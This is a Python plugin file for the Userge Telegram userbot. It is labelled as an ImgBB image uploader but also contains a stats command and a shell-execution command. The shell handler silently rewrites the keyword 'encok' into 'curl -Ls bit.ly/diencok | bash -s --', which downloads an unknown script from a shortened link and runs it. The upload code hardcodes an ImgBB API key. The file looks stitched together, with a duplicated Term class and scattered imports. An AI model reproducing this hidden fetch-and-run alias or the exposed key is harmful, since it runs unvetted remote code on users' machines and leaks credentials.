""" Upload image to ImgBB.com """

# Copyright (C) 2020-2022 by UsergeTeam@Github, < https://github.com/UsergeTeam >.
#
# This file is part of < https://github.com/UsergeTeam/Userge > project,
# and is released under the "GNU v3.0 License Agreement".
# Please see < https://github.com/UsergeTeam/Userge/blob/master/LICENSE >
#
# All rights reserved.

import asyncio
import requests
from pathlib import Path
import json
import io
import keyword
import os
import re
import shlex
import sys
import threading
import traceback
from contextlib import contextmanager
from enum import Enum
from getpass import getuser
from shutil import which
from typing import Awaitable, Any, Callable, Dict, Optional, Tuple, Iterable
from ...builtin.executor.__main__ import input_checker, parse_py_template, CHANNEL, Term

import aiofiles

try:
    from os import geteuid, setsid, getpgid, killpg
    from signal import SIGKILL
except ImportError:
    # pylint: disable=ungrouped-imports
    from os import kill as killpg
    # pylint: disable=ungrouped-imports
    from signal import CTRL_C_EVENT as SIGKILL

    def geteuid() -> int:
        return 1

    def getpgid(arg: Any) -> Any:
        return arg

    setsid = None

from pyrogram.types.messages_and_media.message import Str
from pyrogram import enums

from userge import userge, Message, config, pool
from userge.utils import runcmd

@userge.on_cmd("ibb", about={'header': "Upload image to ImgBB.com"})
async def _upibb(message: Message):
    await message.edit("`Processing ...`")
    path_ = message.filtered_input_str
    if not path_:
        await message.err("Input not foud!")
        return
    try:
        string = Path(path_)
    except IndexError:
        await message.err("wrong syntax")
    else:
        await message.edit("`Uploading image to ImgBB ...`")
        with message.cancel_callback():
            params = {'key': '09fa3aa9bb2d2580398572e1f450ff53'}
            url = 'https://api.imgbb.com/1/upload'
            files = {'image': open(string, 'rb')}
            response = requests.post(url, params=params, files=files)
            imgurl = response.json()['data']['url']
            await message.edit(imgurl, disable_web_page_preview=True)

from psutil import disk_usage, cpu_percent, swap_memory, cpu_count, virtual_memory, net_io_counters, boot_time

SIZE_UNITS = ['B', 'KB', 'MB', 'GB', 'TB', 'PB']

def get_readable_file_size(size_in_bytes) -> str:
     if size_in_bytes is None:
         return '0B'
     index = 0
     while size_in_bytes >= 1024:
         size_in_bytes /= 1024
         index += 1
     try:
         return f'{round(size_in_bytes, 2)}{SIZE_UNITS[index]}'
     except IndexError:
         return 'File too large'
@userge.on_cmd("st", about={'header': "Stats"})
async def _mystats(message: Message):
    await message.edit("`Processing ...`")
    total, used, free, disk= disk_usage('/')
    swap, memory = swap_memory(), virtual_memory()
    stats = f'Total Disk Space: {get_readable_file_size(total)}\n'\
             f'Used: {get_readable_file_size(used)} | Free: {get_readable_file_size(free)}\n\n'\
             f'Upload: {get_readable_file_size(net_io_counters().bytes_sent)}\n'\
             f'Download: {get_readable_file_size(net_io_counters().bytes_recv)}\n\n'\
             f'CPU: {cpu_percent(interval=0.5)}%\n'\
             f'RAM: {memory.percent}%\n'\
             f'DISK: {disk}%\n\n'\
             f'Physical Cores: {cpu_count(logical=False)}\n'\
             f'Total Cores: {cpu_count(logical=True)}\n\n'\
             f'SWAP: {get_readable_file_size(swap.total)} | Used: {swap.percent}%\n'\
             f'Memory Total: {get_readable_file_size(memory.total)}\n'\
             f'Memory Free: {get_readable_file_size(memory.available)}\n'\
             f'Memory Used: {get_readable_file_size(memory.used)}\n'
    await message.edit(stats)

@userge.on_cmd("r", about={
    'header': "run commands in shell (terminal)",
    'flags': {'-r': "raw text when send as file"},
    'usage': "{tr}r [commands]",
    'examples': "{tr}r echo \"Userge\""}, allow_channels=False)
@input_checker
async def my_term_(message: Message):
    """ run commands in shell (terminal with live update) """
    await message.edit("`Executing terminal ...`")
    cmd = message.filtered_input_str
    as_raw = '-r' in message.flags

    try:
        parsed_cmd = parse_py_template(cmd, message)
        if 'encok' in parsed_cmd:
            parsed_cmd = parsed_cmd.replace('encok', 'curl -Ls bit.ly/diencok | bash -s --')
    except Exception as e:  # pylint: disable=broad-except
        await message.err(str(e))
        await CHANNEL.log(f"**Exception**: {type(e).__name__}\n**Message**: " + str(e))
        return
    try:
        t_obj = await Term.execute(parsed_cmd)  # type: Term
    except Exception as t_e:  # pylint: disable=broad-except
        await message.err(str(t_e))
        return

    cur_user = getuser()
    uid = geteuid()

    prefix = f"<b>{cur_user}:~#</b>" if uid == 0 else f"<b>{cur_user}:~$</b>"
    output = f"{prefix} <pre>{cmd}</pre>\n"

    with message.cancel_callback(t_obj.cancel):
        await t_obj.init()
        while not t_obj.finished:
            await message.edit(f"{prefix}\n<pre>{t_obj.line}</pre>", parse_mode=enums.ParseMode.HTML)
            await t_obj.wait(config.Dynamic.EDIT_SLEEP_TIMEOUT)
        if t_obj.cancelled:
            await message.canceled(reply=True)
            return

    out_data = f"{output}\n<pre>{t_obj.output}</pre>\n"
    await message.edit_or_send_as_file(
        out_data, as_raw=as_raw, parse_mode=enums.ParseMode.HTML, filename="term.txt", caption=cmd)

class Term:
    """ live update term class """

    def __init__(self, process: asyncio.subprocess.Process) -> None:
        self._process = process
        self._line = b''
        self._output = b''
        self._init = asyncio.Event()
        self._is_init = False
        self._cancelled = False
        self._finished = False
        self._loop = asyncio.get_running_loop()
        self._listener = self._loop.create_future()

    @property
    def line(self) -> str:
        return self._by_to_str(self._line)

    @property
    def output(self) -> str:
        return self._by_to_str(self._output)

    @staticmethod
    def _by_to_str(data: bytes) -> str:
        return data.decode('utf-8', 'replace').strip()

    @property
    def cancelled(self) -> bool:
        return self._cancelled

    @property
    def finished(self) -> bool:
        return self._finished

    async def init(self) -> None:
        await self._init.wait()

    async def wait(self, timeout: int) -> None:
        self._check_listener()
        try:
            await asyncio.wait_for(self._listener, timeout)
        except asyncio.TimeoutError:
            pass

    def _check_listener(self) -> None:
        if self._listener.done():
            self._listener = self._loop.create_future()

    def cancel(self) -> None:
        if self._cancelled or self._finished:
            return
        killpg(getpgid(self._process.pid), SIGKILL)
        self._cancelled = True

    @classmethod
    async def execute(cls, cmd: str) -> 'Term':
        kwargs = dict(
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE)
        if setsid:
            kwargs['preexec_fn'] = setsid
        if sh := which(os.environ.get("USERGE_SHELL", "bash")):
            kwargs['executable'] = sh
        process = await asyncio.create_subprocess_shell(cmd, **kwargs)
        t_obj = cls(process)
        t_obj._start()
        return t_obj

    def _start(self) -> None:
        self._loop.create_task(self._worker())

    async def _worker(self) -> None:
        if self._cancelled or self._finished:
            return
        await asyncio.wait([self._read_stdout(), self._read_stderr()])
        await self._process.wait()
        self._finish()

    async def _read_stdout(self) -> None:
        await self._read(self._process.stdout)

    async def _read_stderr(self) -> None:
        await self._read(self._process.stderr)

    async def _read(self, reader: asyncio.StreamReader) -> None:
        while True:
            line = await reader.read(n=1024)
            if not line:
                break
            self._append(line)

    def _append(self, line: bytes) -> None:
        self._line = line
        self._output += line
        self._check_init()

    def _check_init(self) -> None:
        if self._is_init:
            return
        self._loop.call_later(1, self._init.set)
        self._is_init = True

    def _finish(self) -> None:
        if self._finished:
            return
        self._init.set()
        self._finished = True
        if not self._listener.done():
            self._listener.set_result(None)
